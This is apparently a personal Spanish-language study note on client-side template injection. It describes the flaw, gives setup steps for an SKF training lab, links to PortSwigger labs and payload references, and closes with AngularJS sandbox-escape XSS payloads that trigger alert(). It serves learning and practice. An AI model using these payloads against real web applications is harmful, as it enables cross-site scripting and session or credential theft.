> Client-side template injection vulnerabilities arise when applications using a client-side template framework dynamically embed user input in web pages. 
 
- When a web page is rendered, the framework will scan the page for template expressions, and execute any that it encounters. 
- An attacker can exploit this by supplying a malicious template expression that launches a cross-site scripting (XSS) attack. 
- As with normal cross-site scripting, the attacker-supplied code can perform a wide variety of actions, such as stealing the victim's session token or login credentials, performing arbitrary actions on the victim's behalf, and logging their keystrokes.

---
## Laboratorios
- Yo te digo lo que hizo savitar que no funciono, pero bueno ya fue
```
git clone https://github.com/blabla1337/skf-labs.git --depth 1
cd skf-labs/python/CSTI
pip2 install -r requirements.txt
python3 CSTI.py
```
- Si no tenes pip2 tenes que primero instalar python2 con `sudo apt install python2` que ya no existe, luego pip2 con `curl https://bootstrap.pypa.io/pip/2.7/get-pip.py --output get-pip.py` y luego `sudo python2 get-pip.py`
- Ya despues es acceder a la web y ejecutar los comandos de ataque

- Otra forma es con los laboratorio de [[Port Swigger]] especificamente aqui [Link a los labs de XSS](https://portswigger.net/web-security/all-labs#cross-site-scripting) si bien es XSS los labs mas avanzados de esta seccion son inyecciones especificas hacia frameworks como Angular, Django que permiten la inyeccion de codigo malicioso.

## Ataques
- Aca va a depender que framework y su version pero aca van las paginas principales:
- [payload all the things - XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
- [hack tricks - CSTI](https://hacktricks.wiki/en/pentesting-web/client-side-template-injection-csti.html)
- Esta es la verdadera biblia [hack tricks XSS](https://hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/index.html)

```
{{7*7}}
{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}
{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(String.fromcharCode(88,83,83))');}} # alert('XSS')
```